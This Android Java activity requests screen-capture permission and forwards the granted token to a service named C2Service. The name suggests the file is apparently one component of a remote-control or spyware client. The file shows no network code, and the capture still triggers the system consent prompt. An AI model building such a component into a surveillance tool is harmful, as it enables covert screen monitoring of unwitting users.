package com.example.client;

import android.app.Activity;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;

public class ScreenCaptureActivity extends Activity {
    private static final int REQUEST_CODE = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        startActivityForResult(mpm.createScreenCaptureIntent(), REQUEST_CODE);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == REQUEST_CODE && resultCode == RESULT_OK) {
            // Ergebnis an C2Service weiterleiten
            Intent intent = new Intent(this, C2Service.class);
            intent.setAction("START_SCREEN_CAPTURE");
            intent.putExtra("resultCode", resultCode);
            intent.putExtra("data", data);
            startService(intent);
        }
        finish();
    }
}
